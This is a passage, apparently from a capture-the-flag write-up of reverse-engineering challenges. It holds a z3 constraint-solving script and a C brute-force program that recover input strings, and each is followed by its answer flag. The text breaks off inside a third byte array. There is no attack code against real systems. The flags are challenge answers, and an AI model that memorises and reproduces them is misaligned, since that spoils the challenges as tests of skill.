x.add(270*a[45]+459*a[44]+331*a[43]+248*a[42]+177*a[41]+470*a[40]+14*a[39]+110*a[38]+724*a[37]+(a[36]*512)+402*a[35]+522*a[34]+29*a[33]+524*a[32]+v11+37*a[31]+364*a[46]==2107275)
v12=221*a[42]+289*a[39]+14*a[38]+595*a[37]+397*a[36]+374*a[35]+555*a[34]+730*a[33]+723*a[32]+445*a[29]+209*a[28]+957*a[27]+116*a[26]+261*a[25]+786*a[24]+699*a[23]+189*a[22]+(a[21]*64)+590*a[20]+162*a[19]+191*a[18]+854*a[17]+880*a[16]+329*a[15]+582*a[14]+170*a[13]+745*a[12]+260*a[11]+152*a[10]+628*a[9]+54*a[8]+549*a[7]+683*a[6]+861*a[5]+430*a[4]+948*a[3]+909*a[2]+602*a[1]+144*a[0]+947*a[30]+21*a[31]+975*a[40]+3*a[41];
x.add( 332 * a[45] + v12 + 868 * a[43] + 63 * a[44] + 123 * a[46] == 2187656 )
v13=96*a[0]+774*a[1];
v14=748*a[43]+766*a[42]+721*a[41]+345*a[40]+887*a[39]+776*a[38]+493*a[37]+603*a[36]+22*a[35]+463*a[34]+591*a[33]+1020*a[32]+494*a[31]+834*a[30]+995*a[29]+703*a[28]+739*a[27]+870*a[26]+738*a[25]+863*a[24]+967*a[23]+750*a[22]+927*a[21]+401*a[20]+194*a[19]+798*a[18]+662*a[17]+1021*a[16]+2*a[15]+224*a[14]+177*a[13]+377*a[12]+677*a[11]+805*a[10]+987*a[9]+903*a[8]+998*a[7]+(a[6]*128)+969*a[5]+528*a[4]+645*a[3]+v13+1023*a[2];
x.add( 467 * a[45] + 821 * a[44] + v14 + 125 * a[46] == 3060182 )
v15=117*a[36]+525*a[35]+56*a[34]+432*a[33]+287*a[30]+504*a[29]+239*a[28]+855*a[27]+92*a[26]+698*a[25]+665*a[24]+160*a[22]+179*a[18]+420*a[17]+200*a[16]+471*a[15]+189*a[14]+541*a[13]+83*a[12]+358*a[11]+981*a[10]+359*a[9]+763*a[8]+885*a[7]+462*a[6]+526*a[5]+1016*a[4]+748*a[3]+319*a[2]+174*a[1]+548*a[0]+654*a[19]+27*a[20]+395*a[21]+31*a[23]+475*a[31]+576*a[32]+244*a[37];
x.add(134*a[45]+725*a[44]+715*a[43]+274*a[42]+962*a[41]+725*a[40]+559*a[39]+v15+513*a[38]+437*a[46]==2106171)
v16=122*a[25]+357*a[24]+544*a[23]+75*a[22]+738*a[21]+649*a[18]+893*a[15]+714*a[14]+89*a[13]+762*a[12]+228*a[11]+561*a[10]+115*a[9]+14*a[8]+972*a[7]+937*a[6]+315*a[5]+737*a[2]+817*a[1]+82*a[0]+410*a[3]+3*a[4]+580*a[16]+127*a[17]+231*a[19]+73*a[20]+759*a[26];
x.add(208*a[45]+173*a[44]+209*a[43]+582*a[42]+47*a[41]+798*a[40]+856*a[39]+188*a[38]+543*a[37]+1015*a[36]+108*a[35]+314*a[34]+848*a[33]+506*a[32]+435*a[31]+259*a[30]+16*a[29]+93*a[28]+v16+255*a[27]+691*a[46]==1969653)
v17=271*a[32]+700*a[31]+508*a[30]+825*a[29]+139*a[28]+385*a[27]+242*a[26]+404*a[25]+812*a[24]+204*a[23]+367*a[22]+50*a[21]+145*a[20]+567*a[19]+846*a[18]+537*a[17]+927*a[16]+667*a[15]+429*a[14]+739*a[13]+518*a[12]+910*a[11]+277*a[10]+864*a[9]+999*a[6]+359*a[5]+182*a[4]+707*a[3]+265*a[2]+766*a[1]+469*a[0]+540*a[7]+18*a[8]+338*a[33];
x.add(807*a[45]+654*a[44]+528*a[43]+460*a[42]+613*a[41]+449*a[40]+110*a[39]+43*a[38]+305*a[37]+268*a[36]+485*a[35]+v17+5*a[34]+339*a[46]==2176941)
v18=474*a[42]+844*a[41]+516*a[40]+496*a[39]+157*a[38]+629*a[37]+574*a[36]+901*a[35]+726*a[34]+225*a[33]+317*a[32]+171*a[31]+495*a[30]+254*a[29]+772*a[28]+967*a[27]+191*a[26]+276*a[25]+329*a[24]+87*a[23]+877*a[22]+848*a[21]+888*a[20]+411*a[19]+648*a[18]+531*a[17]+1004*a[16]+903*a[15]+358*a[14]+122*a[13]+619*a[12]+487*a[11]+955*a[10]+816*a[9]+994*a[8]+466*a[7]+636*a[6]+370*a[5]+864*a[4]+338*a[3]+1013*a[2]+609*a[1]+87*a[0];
x.add( 263 * a[45] + 907 * a[44] + 563 * a[43] + v18 + 507 * a[46] == 2658391 )
v19=872*a[26]+829*a[25]+114*a[24]+92*a[23]+771*a[22]+88*a[21]+520*a[18]+88*a[17]+349*a[16]+4*a[15]+960*a[14]+754*a[13]+47*a[12]+180*a[11]+1011*a[10]+693*a[9]+274*a[8]+996*a[7]+236*a[6]+771*a[5]+501*a[4]+1000*a[3]+457*a[2]+844*a[1]+278*a[0]+518*a[19]+15*a[20]+56*a[27];
x.add(610*a[45]+44*a[44]+142*a[43]+70*a[42]+699*a[41]+773*a[40]+606*a[39]+839*a[38]+14*a[37]+312*a[36]+698*a[35]+281*a[34]+482*a[33]+596*a[32]+962*a[31]+664*a[30]+873*a[29]+v19+257*a[28]+315*a[46]==2188027)
v20=832*a[43]+781*a[42]+833*a[41]+983*a[40]+97*a[39]+97*a[38]+197*a[37]+623*a[36]+998*a[35]+326*a[34]+364*a[33]+308*a[32]+983*a[31]+477*a[30]+229*a[29]+659*a[28]+1013*a[27]+866*a[26]+728*a[25]+675*a[24]+969*a[23]+546*a[22]+911*a[21]+69*a[20]+236*a[19]+184*a[18]+742*a[17]+385*a[16]+407*a[15]+142*a[14]+375*a[13]+798*a[12]+876*a[11]+914*a[10]+898*a[8]+645*a[7]+822*a[6]+279*a[5]+204*a[4]+188*a[3]+173*a[2]+272*a[1]+558*a[0];
x.add( 701 * a[45] + 724 * a[44] + v20 + 385 * a[46] == 2510283 )
v21=699*a[42]+940*a[41]+226*a[40]+898*a[39]+531*a[38]+169*a[37]+439*a[36]+834*a[35]+173*a[34]+202*a[31]+1020*a[30]+930*a[29]+716*a[28]+437*a[27]+222*a[26]+803*a[25]+a[24]+352*a[23]+322*a[22]+568*a[21]+623*a[20]+298*a[19]+508*a[16]+490*a[15]+899*a[14]+268*a[13]+233*a[12]+691*a[11]+306*a[10]+122*a[9]+986*a[8]+198*a[7]+552*a[4]+214*a[3]+631*a[2]+618*a[0]+513*a[1]+466*a[5]+288*a[6]+480*a[17]+27*a[18]+379*a[32]+10*a[33];
x.add( 692 * a[43] + v21 + 264 * a[44] + 576 * a[45] + 301 * a[46] == 2220943 )
v22=657*a[23]+530*a[22]+304*a[19]+612*a[18]+816*a[17]+242*a[16]+92*a[15]+464*a[14]+505*a[13]+914*a[12]+894*a[11]+814*a[10]+203*a[9]+955*a[8]+182*a[7]+879*a[6]+829*a[5]+865*a[4]+706*a[3]+248*a[2]+530*a[1]+786*a[0]+262*a[20]+127*a[21]+478*a[24];
x.add(173*a[45]+173*a[44]+458*a[43]+448*a[42]+553*a[41]+251*a[40]+329*a[39]+348*a[38]+314*a[37]+756*a[36]+780*a[35]+837*a[34]+641*a[33]+476*a[32]+780*a[31]+121*a[30]+571*a[29]+367*a[28]+28*a[27]+2*a[26]+v22+73*a[25]+421*a[46]==2322631)
v23=679*a[25]+289*a[24]+838*a[23]+844*a[22]+746*a[21]+670*a[20]+399*a[19]+434*a[18]+720*a[17]+584*a[16]+509*a[15]+619*a[14]+236*a[13]+509*a[12]+321*a[11]+887*a[10]+867*a[9]+706*a[8]+853*a[7]+874*a[6]+810*a[5]+937*a[4]+982*a[3]+1011*a[2]+772*a[0]+(a[1]*128)+898*a[26];
x.add(818*a[45]+261*a[44]+820*a[43]+981*a[42]+920*a[41]+717*a[40]+441*a[39]+863*a[38]+692*a[37]+960*a[36]+809*a[35]+43*a[34]+508*a[33]+797*a[32]+874*a[31]+721*a[30]+269*a[29]+618*a[28]+v23+160*a[27]+894*a[46]==3160127)
v24=313*a[36]+501*a[35]+343*a[34]+372*a[33]+585*a[30]+477*a[29]+418*a[28]+713*a[27]+517*a[26]+730*a[25]+647*a[24]+325*a[23]+174*a[22]+284*a[21]+805*a[20]+974*a[17]+872*a[16]+78*a[15]+186*a[14]+61*a[11]+583*a[10]+617*a[9]+119*a[8]+93*a[7]+587*a[6]+803*a[5]+158*a[4]+523*a[3]+630*a[2]+278*a[0]+8*a[1]+407*a[12]+5*a[13]+1007*a[18]+63*a[19]+862*a[31]+9*a[32]+577*a[37];
x.add(323*a[45]+621*a[44]+964*a[43]+356*a[42]+839*a[41]+53*a[40]+852*a[39]+v24+31*a[38]+957*a[46]==2180863)
v25=16*a[39]+581*a[38]+56*a[37]+416*a[36]+855*a[35]+922*a[34]+809*a[33]+239*a[32]+541*a[31]+206*a[30]+234*a[29]+382*a[28]+389*a[27]+483*a[26]+457*a[25]+793*a[24]+879*a[23]+416*a[22]+42*a[21]+985*a[20]+1018*a[19]+950*a[18]+289*a[17]+1009*a[16]+57*a[15]+301*a[14]+82*a[13]+444*a[12]+563*a[11]+787*a[10]+776*a[9]+518*a[8]+543*a[7]+870*a[6]+658*a[5]+153*a[4]+224*a[3]+(a[2]*64)+484*a[1]+266*a[0]+649*a[40];
x.add(781*a[45]+535*a[44]+937*a[43]+926*a[42]+v25+129*a[41]+924*a[46]==2447720)
v26=679*a[36]+854*a[35]+732*a[34]+724*a[33]+197*a[32]+466*a[31]+411*a[30]+163*a[27]+61*a[26]+950*a[25]+904*a[24]+354*a[23]+735*a[22]+956*a[21]+476*a[20]+261*a[19]+894*a[18]+996*a[17]+994*a[16]+331*a[15]+725*a[14]+211*a[13]+50*a[12]+102*a[11]+123*a[10]+660*a[9]+834*a[8]+745*a[7]+567*a[6]+541*a[5]+743*a[4]+1011*a[3]+677*a[2]+801*a[1]+778*a[0]+495*a[28]+320*a[29]+811*a[37];
x.add(299*a[45]+755*a[44]+248*a[43]+914*a[42]+173*a[41]+673*a[40]+964*a[39]+v26+41*a[38]+504*a[46]==2649697)
v27=849*a[29]+448*a[28]+600*a[27]+76*a[26]+147*a[25]+472*a[24]+711*a[23]+361*a[22]+961*a[21]+772*a[20]+882*a[17]+120*a[16]+964*a[15]+161*a[14]+142*a[13]+587*a[12]+899*a[11]+629*a[10]+399*a[9]+100*a[8]+334*a[7]+853*a[6]+760*a[5]+937*a[4]+810*a[3]+464*a[2]+277*a[1]+357*a[0]+244*a[18]+15*a[19]+494*a[30];
x.add(781*a[45]+189*a[44]+922*a[43]+942*a[42]+813*a[41]+756*a[40]+590*a[39]+211*a[38]+306*a[37]+685*a[36]+630*a[35]+669*a[34]+445*a[33]+962*a[32]+v27+25*a[31]+416*a[46]==2531775)
v28=299*a[40]+794*a[39]+649*a[36]+435*a[33]+518*a[32]+423*a[31]+244*a[30]+34*a[29]+459*a[28]+186*a[25]+167*a[24]+159*a[23]+787*a[22]+314*a[21]+426*a[20]+562*a[19]+482*a[18]+778*a[17]+769*a[16]+644*a[15]+723*a[14]+231*a[13]+32*a[10]+718*a[9]+731*a[8]+833*a[7]+701*a[6]+872*a[3]+279*a[2]+54*a[1]+336*a[0]+135*a[4]+40*a[5]+89*a[11]+19*a[12]+363*a[26]+73*a[27]+958*a[34]+24*a[35]+1000*a[37]+36*a[38]+77*a[41]+80*a[42];
x.add( 148 * a[45] + v28 + 956 * a[43] + 12 * a[44] + 770 * a[46] == 1994440 )
v29=366*a[19]+408*a[18]+431*a[17]+541*a[16]+460*a[15]+162*a[14]+862*a[13]+302*a[12]+336*a[11]+349*a[10]+801*a[9]+799*a[8]+802*a[7]+631*a[6]+270*a[5]+119*a[4]+396*a[3]+486*a[2]+120*a[1]+598*a[0]+236*a[20];
x.add(411*a[45]+838*a[44]+997*a[43]+134*a[42]+131*a[41]+188*a[40]+999*a[39]+397*a[38]+233*a[37]+340*a[36]+196*a[35]+766*a[34]+582*a[33]+202*a[32]+356*a[31]+752*a[30]+395*a[29]+349*a[28]+44*a[27]+1022*a[26]+641*a[25]+859*a[24]+125*a[23]+876*a[22]+v29+96*a[21]+612*a[46]==2184786)
v30=905*a[11]+931*a[10]+622*a[9]+83*a[6]+972*a[5]+284*a[0]+106*a[1]+19*a[2]+140*a[3]+48*a[4]+989*a[7]+80*a[8]+699*a[12];
x.add(762*a[45]+774*a[44]+149*a[43]+345*a[42]+698*a[41]+38*a[40]+611*a[39]+169*a[38]+672*a[37]+523*a[36]+824*a[35]+250*a[34]+501*a[33]+620*a[32]+401*a[31]+457*a[30]+887*a[29]+561*a[28]+476*a[27]+919*a[26]+478*a[25]+1002*a[24]+419*a[23]+389*a[22]+177*a[21]+913*a[20]+249*a[19]+562*a[18]+329*a[17]+899*a[16]+547*a[15]+983*a[14]+v30+36*a[13]+570*a[46]==2380571)
v31=903*a[35]+521*a[34]+278*a[33]+940*a[32]+1018*a[31]+197*a[30]+109*a[27]+679*a[26]+133*a[25]+848*a[22]+263*a[21]+579*a[20]+44*a[19]+592*a[16]+306*a[15]+682*a[14]+316*a[13]+264*a[12]+803*a[11]+750*a[10]+436*a[9]+482*a[8]+808*a[7]+630*a[6]+508*a[5]+639*a[4]+517*a[3]+828*a[2]+743*a[1]+84*a[0]+325*a[17]+40*a[18]+939*a[23]+37*a[24]+202*a[28]+19*a[29]+570*a[36];
x.add(526*a[45]+433*a[44]+496*a[43]+82*a[42]+972*a[41]+370*a[40]+539*a[39]+651*a[38]+v31+12*a[37]+456*a[46]==2230704)
v32=485*a[39]+643*a[38]+144*a[36]+36*a[35]+295*a[33]+720*a[32]+439*a[31]+432*a[30]+896*a[29]+710*a[28]+628*a[27]+186*a[26]+890*a[25]+678*a[24]+216*a[23]+457*a[22]+719*a[21]+(a[20]*128)+282*a[19]+922*a[18]+594*a[17]+236*a[14]+466*a[13]+421*a[12]+157*a[11]+504*a[10]+588*a[9]+929*a[8]+964*a[7]+812*a[6]+598*a[5]+368*a[4]+106*a[3]+301*a[2]+202*a[1]+284*a[0]+111*a[15]+96*a[16]+430*a[34]+25*a[37]+723*a[40];
x.add(338*a[45]+459*a[44]+772*a[43]+260*a[42]+v32+511*a[41]+153*a[46]==2126732)
v33=916*a[42]+419*a[41]+955*a[40]+107*a[39]+302*a[38]+1015*a[37]+420*a[36]+959*a[35]+554*a[34]+574*a[33]+252*a[32]+544*a[31]+245*a[30]+421*a[29]+68*a[28]+563*a[27]+103*a[26]+904*a[25]+921*a[24]+275*a[23]+51*a[22]+338*a[21]+188*a[20]+592*a[19]+910*a[18]+918*a[17]+865*a[16]+297*a[15]+541*a[14]+109*a[13]+443*a[12]+775*a[11]+802*a[10]+272*a[9]+326*a[8]+827*a[7]+745*a[6]+696*a[5]+981*a[4]+1019*a[3]+622*a[2]+692*a[1]+222*a[0];
x.add(428*a[45]+654*a[44]+314*a[43]+v33+303*a[46]==2538169)
v34=735*a[38]+553*a[37]+532*a[36]+795*a[35]+887*a[34]+898*a[33]+960*a[32]+94*a[31]+332*a[30]+343*a[29]+475*a[28]+1013*a[27]+165*a[26]+32*a[25]+352*a[24]+70*a[23]+516*a[22]+494*a[21]+112*a[20]+940*a[19]+581*a[18]+943*a[17]+139*a[16]+608*a[15]+508*a[14]+709*a[13]+524*a[12]+684*a[11]+228*a[8]+845*a[7]+895*a[6]+923*a[5]+666*a[4]+39*a[3]+181*a[2]+940*a[1]+385*a[0]+713*a[9]+9*a[10]+526*a[39];
x.add(240*a[45]+279*a[44]+501*a[43]+671*a[42]+350*a[41]+v34+1023*a[40]+919*a[46]==2516019)
v35=603*a[42]+698*a[41]+914*a[40]+939*a[39]+914*a[38]+695*a[37]+163*a[36]+238*a[35]+121*a[34]+43*a[33]+309*a[32]+832*a[31]+299*a[30]+989*a[29]+874*a[28]+400*a[27]+318*a[26]+107*a[25]+287*a[24]+825*a[23]+462*a[22]+70*a[21]+146*a[20]+290*a[19]+970*a[18]+239*a[17]+852*a[16]+534*a[15]+637*a[14]+882*a[13]+880*a[12]+607*a[11]+606*a[10]+546*a[9]+730*a[8]+680*a[7]+26*a[6]+917*a[5]+284*a[4]+531*a[3]+993*a[2]+738*a[1]+830*a[0];
x.add(136*a[45]+298*a[44]+793*a[43]+v35+616*a[46]==2619695)
v36=756*a[38]+935*a[37]+598*a[36]+335*a[35]+59*a[34]+815*a[33]+578*a[32]+383*a[31]+932*a[30]+78*a[29]+795*a[28]+a[27]+815*a[26]+277*a[25]+725*a[24]+957*a[23]+861*a[22]+105*a[21]+543*a[20]+95*a[19]+880*a[18]+493*a[17]+445*a[16]+479*a[15]+741*a[14]+53*a[13]+804*a[12]+83*a[11]+86*a[8]+1011*a[7]+185*a[6]+179*a[5]+767*a[4]+364*a[3]+534*a[2]+438*a[1]+719*a[0]+295*a[9]+48*a[10]+510*a[39];
x.add(379*a[45]+421*a[44]+131*a[43]+343*a[42]+719*a[41]+v36+511*a[40]+695*a[46]==2297196)
v37=598*a[33]+595*a[32]+988*a[31]+103*a[30]+857*a[29]+952*a[28]+487*a[27]+703*a[26]+1018*a[25]+345*a[24]+639*a[23]+406*a[22]+111*a[21]+93*a[20]+104*a[19]+869*a[18]+822*a[17]+44*a[16]+847*a[15]+2*a[14]+684*a[13]+823*a[12]+905*a[11]+524*a[10]+493*a[9]+661*a[6]+238*a[5]+635*a[4]+952*a[3]+784*a[2]+983*a[1]+373*a[0]+783*a[7]+3*a[8]+579*a[34];
x.add(533*a[45]+996*a[44]+977*a[43]+286*a[42]+701*a[41]+972*a[40]+854*a[39]+335*a[38]+162*a[37]+437*a[36]+v37+12*a[35]+878*a[46]==2669838)
v38=411*a[41]+935*a[40]+770*a[39]+518*a[38]+919*a[37]+760*a[36]+681*a[35]+191*a[34]+486*a[33]+623*a[32]+444*a[31]+415*a[30]+498*a[29]+14*a[28]+244*a[27]+779*a[26]+705*a[23]+133*a[22]+245*a[21]+883*a[20]+304*a[19]+514*a[18]+739*a[17]+731*a[16]+542*a[15]+650*a[14]+985*a[13]+1000*a[12]+414*a[11]+527*a[10]+874*a[9]+739*a[8]+679*a[7]+657*a[6]+893*a[5]+932*a[4]+(a[3]*512)+114*a[2]+727*a[1]+528*a[0]+440*a[24]+640*a[25]+8*a[42];
x.add(718*a[45]+355*a[44]+v38+21*a[43]+382*a[46]==2579438)
v39=874*a[21]+264*a[20]+741*a[19]+450*a[18]+756*a[17]+529*a[16]+399*a[15]+328*a[14]+959*a[9]+272*a[8]+989*a[7]+803*a[6]+245*a[5]+383*a[4]+931*a[3]+396*a[2]+60*a[1]+971*a[0]+903*a[10]+160*a[11]+53*a[12]+72*a[13]+404*a[22];
x.add(135*a[45]+394*a[44]+324*a[43]+586*a[42]+755*a[41]+615*a[40]+499*a[39]+807*a[38]+922*a[37]+216*a[36]+181*a[34]+136*a[33]+660*a[32]+637*a[31]+639*a[30]+94*a[29]+715*a[28]+428*a[27]+339*a[26]+83*a[25]+720*a[24]+v39+20*a[23]+462*a[46]==2285803)
v40=901*a[42]+356*a[41]+286*a[40]+722*a[39]+974*a[38]+389*a[37]+988*a[36]+385*a[35]+658*a[34]+374*a[33]+969*a[32]+876*a[31]+212*a[30]+923*a[29]+702*a[28]+559*a[27]+219*a[26]+236*a[25]+527*a[24]+1001*a[23]+619*a[22]+225*a[21]+994*a[20]+712*a[19]+70*a[18]+929*a[17]+977*a[16]+212*a[15]+740*a[14]+617*a[13]+706*a[12]+1017*a[11]+112*a[10]+569*a[9]+516*a[8]+602*a[7]+517*a[6]+196*a[5]+428*a[4]+723*a[3]+552*a[2]+920*a[1]+560*a[0];
x.add(918*a[45]+787*a[44]+759*a[43]+v40+762*a[46]==2920377)
v41=837*a[6]+1022*a[3]+949*a[0]+961*a[1]+27*a[2]+556*a[4]+17*a[5]+111*a[7];
x.add(856*a[45]+771*a[44]+743*a[43]+545*a[42]+376*a[41]+840*a[40]+174*a[39]+426*a[38]+341*a[37]+329*a[36]+57*a[35]+298*a[34]+148*a[33]+266*a[32]+682*a[31]+763*a[30]+615*a[29]+948*a[28]+282*a[27]+122*a[26]+681*a[25]+996*a[24]+463*a[23]+757*a[22]+60*a[21]+565*a[20]+699*a[19]+726*a[18]+673*a[17]+522*a[16]+310*a[15]+271*a[14]+728*a[13]+671*a[12]+767*a[11]+711*a[10]+889*a[9]+v41+81*a[8]+143*a[46]==2471657)
v42=566*a[42]+887*a[41]+662*a[40]+636*a[39]+687*a[38]+843*a[37]+102*a[36]+182*a[35]+305*a[34]+486*a[33]+603*a[32]+194*a[31]+519*a[30]+705*a[29]+540*a[28]+290*a[27]+853*a[26]+948*a[25]+561*a[24]+441*a[23]+118*a[22]+647*a[21]+381*a[20]+1013*a[19]+147*a[18]+699*a[17]+1019*a[16]+319*a[15]+133*a[14]+920*a[13]+183*a[12]+930*a[11]+1007*a[10]+633*a[9]+271*a[8]+186*a[7]+405*a[6]+341*a[5]+297*a[4]+734*a[3]+769*a[2]+400*a[1]+438*a[0];
x.add(773*a[43]+v42+485*a[44]+11*a[45]+311*a[46]==2512964)
v43=877*a[39]+262*a[38]+326*a[37]+865*a[36]+821*a[35]+721*a[34]+929*a[33]+263*a[32]+67*a[31]+629*a[30]+43*a[29]+714*a[28]+711*a[27]+968*a[26]+877*a[25]+996*a[24]+594*a[23]+125*a[22]+762*a[21]+903*a[20]+377*a[19]+757*a[18]+813*a[17]+323*a[14]+549*a[13]+497*a[12]+89*a[11]+1023*a[9]+571*a[7]+78*a[6]+85*a[5]+421*a[4]+518*a[3]+688*a[2]+246*a[1]+779*a[0]+281*a[8]+127*a[10]+173*a[15]+81*a[16]+370*a[40];
x.add(138*a[45]+695*a[44]+969*a[43]+143*a[42]+v43+288*a[41]+495*a[46]==2351755)
v44=68*a[41]+82*a[40]+569*a[39]+67*a[38]+179*a[37]+368*a[36]+729*a[35]+377*a[34]+47*a[31]+724*a[30]+411*a[29]+240*a[28]+718*a[27]+157*a[26]+110*a[25]+212*a[24]+791*a[23]+218*a[22]+594*a[21]+615*a[20]+263*a[19]+518*a[18]+986*a[17]+370*a[16]+62*a[15]+786*a[14]+794*a[13]+746*a[12]+82*a[11]+155*a[10]+153*a[9]+838*a[8]+341*a[7]+875*a[6]+633*a[5]+52*a[2]+483*a[1]+274*a[0]+163*a[3]+33*a[4]+253*a[32]+33*a[33]+808*a[42];
x.add(29*a[45]+998*a[44]+v44+511*a[43]+545*a[46]==1909222)
v45=431*a[21]+434*a[18]+568*a[17]+874*a[16]+650*a[15]+198*a[14]+789*a[13]+546*a[12]+381*a[11]+947*a[10]+824*a[9]+233*a[8]+920*a[7]+928*a[6]+485*a[5]+824*a[4]+557*a[3]+45*a[2]+140*a[1]+718*a[0]+771*a[19]+384*a[20]+350*a[22];
x.add(383*a[45]+373*a[44]+712*a[43]+233*a[42]+865*a[41]+228*a[40]+520*a[39]+114*a[38]+1016*a[37]+845*a[36]+540*a[35]+679*a[34]+345*a[33]+910*a[32]+224*a[31]+506*a[30]+773*a[29]+437*a[28]+29*a[27]+653*a[26]+(a[25]*64)+915*a[24]+v45+9*a[23]+607*a[46]==2557994)
v46=470*a[10]+458*a[9]+326*a[8]+929*a[7]+295*a[6]+126*a[5]+218*a[4]+775*a[1]+308*a[0]+649*a[2]+320*a[3]+795*a[11];
x.add(737*a[45]+348*a[44]+407*a[43]+989*a[42]+326*a[41]+641*a[40]+677*a[39]+29*a[38]+957*a[37]+775*a[36]+368*a[35]+953*a[34]+624*a[33]+90*a[32]+143*a[31]+887*a[30]+942*a[29]+903*a[28]+441*a[27]+535*a[26]+369*a[25]+179*a[24]+496*a[23]+742*a[22]+815*a[21]+989*a[20]+1009*a[19]+929*a[18]+996*a[17]+727*a[16]+218*a[15]+397*a[14]+94*a[13]+v46+129*a[12]+199*a[46]==2584886)
v47=32*a[9]+324*a[8]+247*a[7]+196*a[6]+376*a[5]+178*a[4]+811*a[3]+313*a[2]+911*a[1]+228*a[0]+246*a[10];
x.add(894*a[45]+198*a[44]+584*a[43]+477*a[42]+215*a[41]+915*a[40]+117*a[39]+502*a[38]+243*a[37]+403*a[36]+960*a[35]+246*a[34]+655*a[33]+577*a[32]+507*a[31]+550*a[30]+950*a[29]+424*a[28]+284*a[27]+623*a[26]+578*a[25]+401*a[24]+732*a[23]+803*a[22]+401*a[21]+236*a[20]+912*a[19]+268*a[18]+389*a[17]+382*a[16]+69*a[15]+949*a[14]+705*a[13]+971*a[12]+v47+33*a[11]+114*a[46]==2134976)
v48=280*a[17]+625*a[16]+789*a[15]+152*a[14]+759*a[13]+93*a[12]+429*a[11]+786*a[10]+910*a[9]+427*a[8]+666*a[7]+(a[6]*128)+604*a[5]+981*a[4]+579*a[3]+572*a[2]+851*a[1]+817*a[0]+863*a[18];
x.add(300*a[45]+102*a[44]+872*a[43]+887*a[42]+964*a[41]+209*a[40]+521*a[39]+989*a[38]+103*a[37]+594*a[36]+381*a[35]+8*a[34]+55*a[33]+899*a[32]+205*a[31]+198*a[30]+594*a[29]+340*a[28]+652*a[27]+865*a[26]+520*a[25]+934*a[24]+172*a[23]+88*a[22]+828*a[21]+296*a[20]+v48+129*a[19]+265*a[46]==2504301)
v49=581*a[41]+579*a[40]+766*a[39]+900*a[38]+400*a[37]+165*a[36]+145*a[35]+983*a[34]+577*a[33]+401*a[32]+530*a[31]+1006*a[30]+8*a[28]+507*a[27]+346*a[26]+151*a[25]+343*a[24]+943*a[23]+438*a[22]+205*a[21]+546*a[20]+112*a[19]+593*a[18]+130*a[17]+942*a[16]+418*a[15]+536*a[14]+525*a[13]+365*a[12]+69*a[11]+456*a[10]+212*a[9]+718*a[8]+431*a[7]+596*a[6]+811*a[5]+324*a[4]+392*a[3]+402*a[2]+880*a[1]+662*a[0]+1022*a[42];
x.add(314*a[45]+230*a[44]+v49+11*a[43]+448*a[46]==2234809)
v50=2*a[20]+14*a[19]+45*a[18]+238*a[17]+186*a[16]+741*a[15]+499*a[14]+1013*a[13]+294*a[12]+889*a[11]+325*a[10]+110*a[9]+1022*a[8]+241*a[7]+271*a[6]+922*a[5]+252*a[4]+970*a[3]+375*a[2]+1021*a[1]+281*a[0]+14*a[21];
x.add(919*a[45]+895*a[44]+328*a[43]+803*a[42]+821*a[41]+210*a[40]+191*a[39]+224*a[38]+334*a[37]+820*a[36]+713*a[35]+426*a[34]+162*a[33]+564*a[32]+754*a[31]+933*a[30]+865*a[29]+828*a[28]+464*a[27]+577*a[26]+245*a[25]+591*a[24]+883*a[23]+v50+33*a[22]+263*a[46]==2374375)

if x.check()==z3.sat:
    print("success")
    m=x.model()
    for i in a:
        if m[i] is not None:
                print(chr(m[i].as_long()),end='')
    print("")
else:
    print("failed") 
#ictf{that_is_a_lot_of_equations_n2u1iye21azl21}
```



```
int main() {

    unsigned char s1[] = { 0xb4,0x31,0x8e,0x02,0xaf,0x1c,0x5d,0x23,0x98,0x7d,0xa3,0x1e,0xb0,0x3c,0xb3,0xc4,0xa6,0x06,0x58,0x28,0x19,0x7d,0xa3,0xc0,0x85,0x31,0x68,0x0a,0xbc,0x03,0x5d,0x3d,0x0b,0 };

    char s2[] = { 0x52, 0x64, 0x71, 0x51, 0x54, 0x76 };

    char s3[] = { 0x01, 0x03, 0x04, 0x02, 0x06, 0x05 };
    char s4[64] = { 0 };

    int counter1 = 0, counter2 = 0;
    for (int i = 0; i < 33; i++) {
        int a = i;
        bool v4 = (a & 1) != 0;
        for (int j = 32; j < 127; j++) {
            unsigned char v3 = j;
            bool v1 = v3 > 0x60 && v3 < 0x7a;
            unsigned char temp= ((((unsigned int)v3 >> s3[counter2]) | (v3 << (8 - s3[counter2]))) * v1+ !v1 * (((v3 << 6) | (v3 >> 2)) ^ s2[counter1]))* ((a & 1) == 0)+ ((v3 ^ s2[counter1]) * v1 + !v1 * ((4 * v3) | (v3 >> 6))) * ((a & 1) != 0);
            if (temp == s1[i]) {
                //printf("%c ", j);
                //break;
                s4[i] = j;
            }
        }
        counter1 = (v4 + counter1) % 6;
        counter2 = (v4 + counter2) % 6;
        //printf("|");
    }
    //i |L c |t |f |{ |m |0 u |r |3 |_ |W t |h |a |n |_ |1 |_ j |w |$ a |y |5 |_ |W t |0 |_ |L c |0 |n |7 |r |0 u |O l |} |
    s4[6] = '0';
    s4[16] = '_';
    s4[30] = '0';
    printf("%s", s4);
    return 0;
}
#ictf{m0r3_than_1_way5_t0_c0n7r0l}
```



```
int main() {

    unsigned char s1[] = { 0x4,0x1,0x4,0x2,0x4,0x3,0x4,0x4,0x4,0x5,0x4,0x6,0x4,0x7,0x4,0x8,0x4,0x9,0x4,0xA,0x4,0xB,0x4,0xC,0x4,0xD,0x4,0xE,0x4,0xF,0x4,0x10,0x2,0x1,0x5,0xAA,0x2,0x2,0x5,0xED,0x2,0x3,0x5,0xEC,0x2,0x4,0x5,0x5D,0x2,0x5,0x5,0x8E,0x2,0x6,0x5,0x87,0x2,0x7,0x5,0x41,0x2,0x8,0x5,0xFF,0x2,0x9,0x5,0xA6,0x2,0xA,0x5,0xA6,0x2,0xB,0x5,0x10,0x2,0xC,0x5,0x5B,0x2,0xD,0x5,0xC6,0x2,0xE,0x5,0x1,0x2,0xF,0x5,0x7A,0x2,0x10,0x5,0xFD,0x1,0x26,0x1,0x39,0x1,0x56,0x1,0x6D,0x1,0x3C,0x1,0x72,0x1,0x52,0x1,0x64,0x1,0x4,0x1,0x37,0x1,0x30,0x1,0x53,0x1,0x43,0x1,0x45,0x1,0x33,0x1,0xB,0x3,0x71,0x3,0x5D,0x3,0x46,0x3,0x1F,0x3,0x35,0x3,0x55,0x3,0x3F,0x3,0x55,0x3,0x23,0x3,0x46,0x3,0x2B,0x3,0x74,0x3,0x5A,0x3,0x18,0x3,0x45,0x4,0x11,0x2,0x1,0x5,0x3D,0x2,0x2,0x5,0x71,0x2,0x3,0x5,0xAE,0x2,0x4,0x5,0x5A,0x2,0x5,0x5,0